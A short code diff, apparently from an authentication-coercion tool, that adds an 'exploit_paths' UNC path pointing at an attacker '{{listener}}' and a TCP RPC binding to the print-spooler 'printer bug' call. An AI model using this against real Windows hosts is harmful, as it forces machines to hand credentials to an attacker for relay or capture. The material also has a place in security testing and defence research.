@@ -18,11 +18,21 @@ class RpcRemoteFindFirstPrinterChangeNotificationEx(MSPROTOCOLRPCCALL):
      -
     """
 
+    exploit_paths = [
+        ("smb", '\\\\{{listener}}\x00')
+    ]
+
     access = {
         "ncan_np": [
             {
                 "namedpipe": r"\PIPE\spoolss",
                 "uuid": "12345678-1234-abcd-ef00-0123456789ab",
+                "version": "1.0"
+            }
+        ],
+        "ncacn_ip_tcp": [
+            {
+                "uuid": "12345678-1234-ABCD-EF00-0123456789AB",
                 "version": "1.0"
             }
         ]
